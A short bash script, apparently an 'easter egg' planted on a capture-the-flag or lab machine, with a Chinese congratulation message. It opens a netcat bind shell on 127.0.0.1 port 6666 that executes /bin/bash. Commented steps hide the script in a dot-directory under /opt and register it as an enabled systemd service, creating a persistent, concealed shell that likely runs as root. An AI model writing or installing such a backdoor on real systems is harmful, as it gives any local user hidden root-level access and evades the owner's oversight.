#!/bin/bash

echo "恭喜你找到彩蛋!!!" | nc -lvp 6666 -s 127.0.0.1 -e /bin/bash

# 配置问题
# mkdir -p /opt/.secret/.verysecret/
# mv egg.sh /opt/.secret/.verysecret/.egg.sh
# mv egg.service /etc/systemd/system/
# systemctl daemon-reload
# systemctl start egg.service
# systemctl enable egg.service